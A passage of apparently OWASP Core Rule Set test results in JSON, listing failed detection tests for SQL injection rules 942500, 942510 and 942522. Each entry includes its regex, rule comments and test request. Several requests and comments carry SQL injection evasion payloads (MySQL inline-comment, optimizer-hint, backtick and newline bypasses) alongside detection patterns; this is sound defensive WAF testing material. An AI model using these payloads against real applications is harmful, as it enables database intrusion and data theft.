          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?id=9999+or+{if+length((/*+!5000select+username/*!50000from*/user+where+id=1))>0}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942500 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942500,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Detect MySQL in-line comments ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " MySQL in-line comments can be used to bypass SQLi detection."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://dev.mysql.com/doc/refman/8.0/en/comments.html:"
        }, {
          "type" : "Comment",
          "text" : " SELECT /*! STRAIGHT_JOIN */ col1 FROM table1,table2 WHERE ..."
        }, {
          "type" : "Comment",
          "text" : " CREATE TABLE t1(a INT, KEY (a)) /*!50110 KEY_BLOCK_SIZE=1024 */;"
        }, {
          "type" : "Comment",
          "text" : " SELECT /*+ BKA(t1) */ FROM ... ;"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://localhost/test.php?id=9999+or+{if+length((/*!5000select+username/*!50000from*/user+where+id=1))>0}"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The minimal string that triggers this regexp is: /*!*/ or /*+*/."
        }, {
          "type" : "Comment",
          "text" : " The rule 942500 is related to 942440 which catches both /*! and */ independently."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/942500.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942500"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)/\\*[\\s\\x0b]*?[!\\+](?:[\\s\\x0b\\(\\)\\-0-9=A-Z_a-z]+)?\\*/"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942500
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "MySQL in-line comment detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942500",
    "test_id" : 3,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942500.yaml",
    "description" : "Use of optimizer hints (/*+...*/) as evasion technique",
    "cause" : "failed expect_id check: 942500 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=942100 - SQL Injection Attack Detected via libinjection", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Use of optimizer hints (/*+...*/) as evasion technique",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?test=9999+or+%2F*%2Boptimizer+hint+*%2F+true",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942500 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942500,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Detect MySQL in-line comments ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " MySQL in-line comments can be used to bypass SQLi detection."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://dev.mysql.com/doc/refman/8.0/en/comments.html:"
        }, {
          "type" : "Comment",
          "text" : " SELECT /*! STRAIGHT_JOIN */ col1 FROM table1,table2 WHERE ..."
        }, {
          "type" : "Comment",
          "text" : " CREATE TABLE t1(a INT, KEY (a)) /*!50110 KEY_BLOCK_SIZE=1024 */;"
        }, {
          "type" : "Comment",
          "text" : " SELECT /*+ BKA(t1) */ FROM ... ;"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://localhost/test.php?id=9999+or+{if+length((/*!5000select+username/*!50000from*/user+where+id=1))>0}"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The minimal string that triggers this regexp is: /*!*/ or /*+*/."
        }, {
          "type" : "Comment",
          "text" : " The rule 942500 is related to 942440 which catches both /*! and */ independently."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/942500.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942500"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)/\\*[\\s\\x0b]*?[!\\+](?:[\\s\\x0b\\(\\)\\-0-9=A-Z_a-z]+)?\\*/"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942500
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "MySQL in-line comment detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942500",
    "test_id" : 4,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942500.yaml",
    "description" : "Use of optimizer hints (/*+...*/) as evasion technique with space before +",
    "cause" : "failed expect_id check: 942500 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=942100 - SQL Injection Attack Detected via libinjection", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "Use of optimizer hints (/*+...*/) as evasion technique with space before +",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?test=9999+or+%2F*+%2Boptimizer+hint+*%2F+true",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942500 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942500,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Detect MySQL in-line comments ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " MySQL in-line comments can be used to bypass SQLi detection."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://dev.mysql.com/doc/refman/8.0/en/comments.html:"
        }, {
          "type" : "Comment",
          "text" : " SELECT /*! STRAIGHT_JOIN */ col1 FROM table1,table2 WHERE ..."
        }, {
          "type" : "Comment",
          "text" : " CREATE TABLE t1(a INT, KEY (a)) /*!50110 KEY_BLOCK_SIZE=1024 */;"
        }, {
          "type" : "Comment",
          "text" : " SELECT /*+ BKA(t1) */ FROM ... ;"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://localhost/test.php?id=9999+or+{if+length((/*!5000select+username/*!50000from*/user+where+id=1))>0}"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The minimal string that triggers this regexp is: /*!*/ or /*+*/."
        }, {
          "type" : "Comment",
          "text" : " The rule 942500 is related to 942440 which catches both /*! and */ independently."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/942500.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942500"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)/\\*[\\s\\x0b]*?[!\\+](?:[\\s\\x0b\\(\\)\\-0-9=A-Z_a-z]+)?\\*/"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942500
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "MySQL in-line comment detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942500",
    "test_id" : 5,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942500.yaml",
    "description" : "Status Page Test - MySQL inline comment detected",
    "cause" : "failed expect_id check: 942500 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "Status Page Test - MySQL inline comment detected",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?test=9999+or+{if+length((/*!5000select+username/*!comment*/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942500 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942500,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Detect MySQL in-line comments ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " MySQL in-line comments can be used to bypass SQLi detection."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://dev.mysql.com/doc/refman/8.0/en/comments.html:"
        }, {
          "type" : "Comment",
          "text" : " SELECT /*! STRAIGHT_JOIN */ col1 FROM table1,table2 WHERE ..."
        }, {
          "type" : "Comment",
          "text" : " CREATE TABLE t1(a INT, KEY (a)) /*!50110 KEY_BLOCK_SIZE=1024 */;"
        }, {
          "type" : "Comment",
          "text" : " SELECT /*+ BKA(t1) */ FROM ... ;"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://localhost/test.php?id=9999+or+{if+length((/*!5000select+username/*!50000from*/user+where+id=1))>0}"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The minimal string that triggers this regexp is: /*!*/ or /*+*/."
        }, {
          "type" : "Comment",
          "text" : " The rule 942500 is related to 942440 which catches both /*! and */ independently."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/942500.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942500"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)/\\*[\\s\\x0b]*?[!\\+](?:[\\s\\x0b\\(\\)\\-0-9=A-Z_a-z]+)?\\*/"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942500
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "MySQL in-line comment detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942510",
    "test_id" : 1,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942510.yaml",
    "description" : "SQLi bypass detected: backticks",
    "cause" : "failed expect_id check: 942510 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "SQLi bypass detected: backticks",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?`bla`",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942510 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942510,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Detect SQLi bypass: backticks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Quotes and backticks can be used to bypass SQLi detection."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Example:"
        }, {
          "type" : "Comment",
          "text" : " GET http://localhost/test.php?id=9999%20or+{`if`(2=(select+2+from+wp_users+where+user_login='admin'))}"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The minimum text between the ticks or backticks must be 2 (if, for example) and a maximum of 29."
        }, {
          "type" : "Comment",
          "text" : " 29 is a compromise: The lower this number (29), the lower the probability of FP and the higher the probability of false negatives."
        }, {
          "type" : "Comment",
          "text" : " In tests we got a minimum number of FP with {2,29}."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Base64 encoding detection:"
        }, {
          "type" : "Comment",
          "text" : " (?:[A-Za-z0-9+/]{4})+ #match any number of 4-letter blocks of the base64 char set"
        }, {
          "type" : "Comment",
          "text" : " (?:[A-Za-z0-9+/]{2}== #match 2-letter block of the base64 char set followed by \"==\", together forming a 4-letter block"
        }, {
          "type" : "Comment",
          "text" : " |                     # or"
        }, {
          "type" : "Comment",
          "text" : " [A-Za-z0-9+/]{3}=     #match 3-letter block of the base64 char set followed by \"=\", together forming a 4-letter block"
        }, {
          "type" : "Comment",
          "text" : " )?"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The minimal string that triggers this regexp is: `if`"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The rule 942511 is similar to this rule, but triggers on normal quotes"
        }, {
          "type" : "Comment",
          "text" : " ('if'). That rule runs in paranoia level 3 or higher since it is prone to"
        }, {
          "type" : "Comment",
          "text" : " false positives in natural text."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:`(?:(?:[\\w\\s=_\\-+{}()<@]){2,29}|(?:[A-Za-z0-9+/]{4})+(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?)`)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942510
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQLi bypass attempt by ticks or backticks detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942522",
    "test_id" : 7,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942522.yaml",
    "description" : "New line bypass",
    "cause" : "failed expect_id check: 942522 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942330 - Detects classic SQL injection probings 1/3", "phase=2 rule_id=942521 - Detects basic SQL authentication bypass attempts 4.1/4", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "New line bypass",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "var=newline%0A%5C' and 1",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
